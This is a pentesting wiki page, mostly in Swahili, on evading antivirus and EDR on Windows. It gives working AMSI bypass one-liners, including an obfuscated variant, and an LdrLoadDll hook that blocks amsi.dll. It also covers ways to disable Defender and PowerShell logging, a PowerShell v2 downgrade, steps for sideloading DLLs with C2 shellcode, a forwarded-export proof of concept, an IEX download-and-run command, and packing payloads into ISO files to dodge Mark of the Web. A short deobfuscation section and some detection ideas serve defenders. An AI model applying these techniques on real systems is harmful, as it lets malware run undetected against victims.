# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzuia Windows Defender kufanya kazi kwa kuiga AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu tofauti za kukagua ikiwa faili ni hatari au la: static detection, dynamic analysis, na kwa EDRs za hali ya juu, behavioural analysis.

### **Static detection**

Static detection hufanywa kwa kuweka alama nyaya zilizo hatari zinazojulikana au safu za bytes katika binary au script, na pia kuchambua taarifa kutoka kwenye faili yenyewe (e.g. file description, company name, digital signatures, icon, checksum, etc.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda tayari zimetathminiwa na kuwekwa alama kama hatari. Kuna njia kadhaa za kuzunguka aina hii ya detection:

- **Encryption**

Ikiwa uta-encrypt binary, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha program kwenye memory.

- **Obfuscation**

Wakati mwingine kinachohitajika ni kubadilisha strings fulani katika binary au script yako ili kupita kwa AV, lakini hili linaweza kuchukua muda kulingana na unachojaribu kuficha.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, haitakuwa na signatures zinazojulikana kama mbaya, lakini hii inahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa msingi, hugawanya faili katika sehemu nyingi kisha kuagiza Defender iskanie kila sehemu kando-kando; kwa hivyo, inaweza kukuambia hasa ni strings au bytes zipi zilizowekwa alama katika binary yako.

Ninapendekeza kwa nguvu uangalie hili [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapoendesha binary yako katika sandbox na kuangalia shughuli hatarishi (e.g. kujaribu ku-decrypt na kusoma password za browser yako, kufanya minidump kwenye LSASS, etc.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo ambayo unaweza kufanya kuepuka sandboxes.

- **Sleep before execution** Kutegemea jinsi imeimplimentiwa, inaweza kuwa njia nzuri ya kuzuia dynamic analysis ya AV. AVs zina muda mfupi sana wa kuscan faili ili zisivurugue mtiririko wa kazi wa mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kupitisha tu sleep kulingana na jinsi imeimplimentiwa.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache za kufanya kazi nazo (e.g. < 2GB RAM), vinginevyo zingedhamiria kufanya kazi polepole kwa mtumiaji. Unaweza pia kuwa mbunifu hapa, kwa mfano kwa kuangalia joto la CPU au hata spidi za fan, si kila kitu kitakuwa kimeimplimentiwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kufanya ukaguzi wa domain ya kompyuta kuona ikiwa inalingana na ile uliyobainisha; ikiwa haizingatii, unaweza kufanya program yako itoke.

Imebainika kuwa Microsoft Defender's Sandbox computername ni HAL9TH, hivyo unaweza kuangalia jina la kompyuta katika malware yako kabla ya kupomea; ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu jinsi ya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali, **public tools** hatimaye zitagunduliwa, kwa hivyo unapaswa jiuliza jambo:

Kwa mfano, ikiwa unataka dump LSASS, **je, kweli unahitaji kutumia mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana zaidi ambao pia hutoa dump ya LSASS.

Jibu sahihi huenda likawa la pili. Kuchukua mimikatz kama mfano, ni moja ya, ikiwa siyo yenye kufichwa zaidi, kipande cha malware kinachotambulika zaidi na AVs na EDRs; mradi wenyewe ni baridi sana, lakini pia ni shida kubwa kuufanya ufanyike kuzunguka AVs, hivyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payload zako kwa ajili ya evasion, hakikisha **uzima automatic sample submission** katika defender, na tafadhali, kwa uzito, **USIPAKIE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, na itest hapo mpaka uridhike na matokeo.

## EXEs vs DLLs

Kadri inavyowezekana, kila mara **prioritize kutumia DLLs kwa ajili ya evasion**, kwa uzoefu wangu, faili za DLL mara nyingi huwa **hazigunduliki sana** na kuchambuliwa, hivyo ni mbinu rahisi sana ya kuepuka detection katika baadhi ya kesi (kama payload yako ina njia ya kuendesha kama DLL bila shaka).

Kama tunavyoona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 katika antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>kulinganisha kwa antiscan.me ya payload ya kawaida ya Havoc EXE dhidi ya payload ya kawaida ya Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unaweza kutumia na faili za DLL ili uwe mchafulia zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inafaidika na taratibu za kutafuta DLL zinazotumiwa na loader kwa kuweka programu ya mwathiriwa na payload(s) hatarishi kando kwa kando.

Unaweza kuangalia programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL ambazo zinajaribu kupakia.

Ninapendekeza sana u**chunguza DLL Hijackable/Sideloadable programs mwenyewe**, mbinu hii inaficha vizuri ikiwa itafanywa ipasavyo, lakini ikiwa utatumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kushikwa kwa urahisi.

Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia haitapakia payload yako, kwa sababu programu inatarajia baadhi ya kazi maalumu ndani ya DLL hiyo. Kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapitisha miito ambayo programu inafanya kutoka kwa proxy (na DLL mbaya) kwenda kwa DLL ya asili, hivyo kuhifadhi utendakazi wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ni hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili ambayo imepewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote shellcode yetu (encoded with [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza **sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa undani.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuonyesha kwa code, entry ya export ina ASCII string ya muundo `TargetDll.TargetFunc`. Wakati caller anapofanya resolve export, the Windows loader itafanya:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwenye protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL unatumiwa, ambao unajumuisha directory ya module inayofanya forward resolution.

Hii inaruhusu primitive isiyo ya moja kwa moja ya sideloading: tafuta signed DLL inayotoa export iliyoforward kwa jina la module lisilo la KnownDLL, kisha weka signed DLL hiyo pamoja na attacker-controlled DLL iliyopewa jina hasa kama module lengwa lililotumwa. Wakati forwarded export itakapoitwa, loader itaresolve forward na itapakia DLL yako kutoka saraka ile ile, ikitekeleza DllMain yako.

Mfano uliotazamwa kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` sio KnownDLL, kwa hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyotiwa saini kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda hiyo hiyo. `DllMain` ndogo kabisa inatosha kupata code execution; hautaji kutekeleza forwarded function ili kuchochea `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (imewekwa saini) inapakia side-by-side `keyiso.dll` (imewekwa saini)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapata kosa la "missing API" tu baada ya `DllMain` tayari kuendesha

Hunting tips:
- Lenga forwarded exports ambapo moduli lengwa si KnownDLL. KnownDLLs zimetajwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/ulinzi:
- Fuatilia LOLBins (mfano, rundll32.exe) zinapakia signed DLLs kutoka njia zisizo za mfumo, ikifuatiwa na kupakia non-KnownDLLs zenye jina la msingi sawa kutoka saraka hiyo
- Toa onyo kuhusu mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa code (WDAC/AppLocker) na kataza write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia fiche.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu — ikiwa inawezekana, jaribu kuunganisha multiple evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs ziliweza tu kuchunguza **files on disk**, hivyo ikiwa unaweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haikuweza kufanya chochote kuzuia, kwa kuwa haina uonekano wa kutosha.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu antivirus kuchunguza tabia za script kwa kuonyesha maudhui ya script kwa namna isiyo-encrypted na isiyofifishwa.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka kabla `amsi:` na kisha njia ya executable kutoka ambapo script ilikimbia, katika kesi hii, powershell.exe

Hatukuacha faili yoyote kwenye disk, lakini bado tulikamatwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code inapitishwa kupitia AMSI pia. Hii inaathiri hata `Assembly.Load(byte[])` kwa ajili ya load in-memory execution. Ndiyo sababu inashauriwa kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kwa in-memory execution ikiwa unataka evade AMSI.

Kuna njia chache za kuepuka AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa kawaida hufanya kazi kwa static detections, hivyo kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya evading detection.

Hata hivyo, AMSI ina uwezo wa unobfuscating scripts hata kama zimefifishwa kwa tabaka nyingi, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi ilivyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha majina ya couple ya variable na itatosha, hivyo inategemea ni kwa kiasi gani kitu kimeflagged.

- **AMSI Bypass**

Kwa kuwa AMSI imeutekelezwa kwa kuingiza DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuingilia kazi yake kwa urahisi hata ukiwa unakimbia kama unprivileged user. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua multiple ways za evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) itasababisha kwamba hakuna scan itakayofanywa kwa current process. Asili hii ilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeendeleza signature kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilitosha mstari mmoja wa msimbo wa powershell kuifanya AMSI isitumike kwa mchakato wa powershell uliopo. Mstari huu, bila shaka, umebainishwa na AMSI yenyewe, hivyo marekebisho madogo yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inyesimamia scanning ya ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo kurudisha code ya E_INVALIDARG; kwa njia hii, matokeo ya scan halisi yatakuwa 0, ambayo inatafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma https://rastamouse.me/memory-patching-amsi-bypass/ kwa maelezo ya kina.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI inaoanzishwa tu baada ya `amsi.dll` kupakiwa katika current process. Njia imara, isiyoegemea lugha, ya bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarejesha error wakati module iliyohitajika ni `amsi.dll`. Kwa hivyo, AMSI haitapakiwa na hakuna scans zitakazofanyika kwa process hiyo.

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Inafanya kazi kwa PowerShell, WScript/CScript na custom loaders (chochote ambacho kingetengeneza kupakia AMSI).
- Pai na kupeleka scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka alama ndefu kwenye mstari wa amri.
- Imeonekana ikitumika na loaders zinazotekelezwa kupitia LOLBins (kwa mfano, `regsvr32` inayoitwa `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) pia inazalisha script za kupitisha AMSI.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hii inafanya kazi kwa kuchunguza kumbukumbu ya mchakato wa sasa kwa saini ya AMSI kisha kuiandika tena kwa maagizo ya NOP, kwa ufanisi kuiondoa kutoka kwenye kumbukumbu.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## Uandishi wa PS

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa ukaguzi na kutatua matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugunduliwa**.

Ili kuepuka PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha script zako bila kusomwa na AMSI. Unaweza kufanya hivyo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuzindua powershell bila kinga (hili ndilo kinachotumiwa na `powerpick` kutoka Cobal Strike).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea kusimbua data, jambo linaloongeza entropy ya binary na kufanya AVs na EDRs ziwe rahisi kugundua. Kuwa mwangalifu na hili na labda tumia encryption tu kwenye sehemu maalum za msimbo wako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au forks za kibiashara) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mwendo kazi hapa chini hu **rejesha IL karibu asili** kwa uhakika ambayo baadaye inaweza ku-decompile kuwa C# kwa zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Hii pia inabadilisha PE checksum hivyo mabadiliko yoyote yatapelekea programu kuanguka. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kurejesha XOR keys na kuandika assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output inajumuisha vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – weka faili *safi* kwenye **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itaondoa control-flow flattening, kurejesha namespaces, classes na majina ya variables ya asili na kusimbua constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja kuwa wrappers nyepesi (a.k.a *proxy calls*) ili kusababisha decompilation kushindikana zaidi. Zifutie kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utaona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Manual clean-up – enda kwa binary iliyotokana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kutambua payload halisi. Mara nyingi malware inaihifadhi kama TLV-encoded byte array iliyoanzishwa ndani ya `<Module>.byte_0`.

Mnyororo ulio hapo juu unarejesha execution flow **bila** kuhitaji kuendesha sampuli hatari – inafaa wakati ukifanya kazi kwenye workstation isiyounganishwa.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuscator ya C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kuongeza usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` lugha kuzalisha, wakati wa compile, code iliyofichwa bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaunda safu ya shughuli zilizofichwa zinazotengenezwa na C++ template metaprogramming framework ambazo zitatumia mtu anayetarajia kuvunja application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina tofauti za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya fine-grained code obfuscation kwa lugha zinazotungwa na LLVM ikitumia ROP (return-oriented programming). ROPfuscator inaficha programu kwenye assembly code level kwa kubadilisha maelekezo ya kawaida kuwa ROP chains, na kuzuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzizusha

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii wakati wa kupakua baadhi ya executables kutoka mtandao na kuziendesha.

Microsoft Defender SmartScreen ni mfumo wa usalama uliolenga kulinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hatarishi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi hasa kwa mbinu ya msingi wa reputation, ikimaanisha kwamba applications zisizopakuliwa mara nyingi zitasababisha SmartScreen kutoa tahadhari na kuzuia mtumiaji wa mwisho kuendesha faili (ingawa faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua faili kutoka mtandao, pamoja na URL ambayo ilipakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS kwa faili iliyopakuliwa kutoka mtandao.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa na cheti cha kusaini kinachotumika kuaminika **hazitashusha tahadhari ya SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

